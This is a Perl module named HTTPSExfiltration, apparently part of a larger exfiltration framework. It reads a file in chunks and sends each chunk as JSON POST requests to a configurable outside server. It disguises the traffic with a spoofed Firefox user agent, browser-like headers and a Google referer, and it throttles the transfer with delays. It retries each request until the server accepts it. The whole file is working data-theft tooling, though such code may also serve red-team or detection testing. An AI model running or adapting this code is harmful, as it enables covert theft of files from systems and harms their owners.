#!/usr/bin/perl

package HTTPSExfiltration;

require Entity::ExfiltrationEngine;

use Moose;
extends 'ExfiltrationEngine';

use LWP::UserAgent;
use JSON;
use Readonly;
use Term::ProgressBar;

Readonly my $START_TRANSFER => 1;
Readonly my $IN_TRANSFER => 0;
Readonly my $END_TRANSFER => -1;

sub setHeader {
    my($req) = @_;

    $req->header('x-auth-token' => 'kfksj48sdfj4jd9d');
    $req->header('Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
    $req->header('Accept-Language' => 'en-US,en;q=0.5');
    $req->header('Accept-Encoding' => 'gzip, deflate, br');
    $req->header('Referer' => 'https://google.com/');
    $req->header('DNT' => '1');
    $req->header('Cache-Control' => 'max-age=0');
}

sub sendData {
    my($request, $userAgent, $file, $data, $id, $state) = @_;
    my $res = 0;

    my $hash = {
        id      =>  $id,
        file    =>  $file,
        data    =>  $data,
        state   =>  $state
    };

    $request->content(encode_json $hash);

    while (!$res || $res->code != 200) {
        $res = $userAgent->request($request);
    }
}

sub exfiltrate {
    my($self, $file) = @_;
    my($data, $n, $count);
    my $userAgent = new LWP::UserAgent;
    my $request = new HTTP::Request 'POST' => $self->dest;
    my $id = int(rand(100000)) + int(rand(100));

    my $fileSize = $self->SUPER::load($file);
    my $progress = Term::ProgressBar->new ({count => $fileSize ,name => "Sending $file",ETA=>'linear'});

    $userAgent->agent('Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0');

    setHeader($request);

    sendData($request, $userAgent, $file, '', $id, $START_TRANSFER);

    $count = 0;
    while (($n = read $self->file, $data, $self->size) != 0) {
        $count += $n;
        sendData($request, $userAgent, $file, $data, $id, $IN_TRANSFER);
        $progress->update($count);

        sleep($self->delay);
    }

    sendData($request, $userAgent, $file, '', $id, $END_TRANSFER);

    $self->SUPER::close();
}

1;
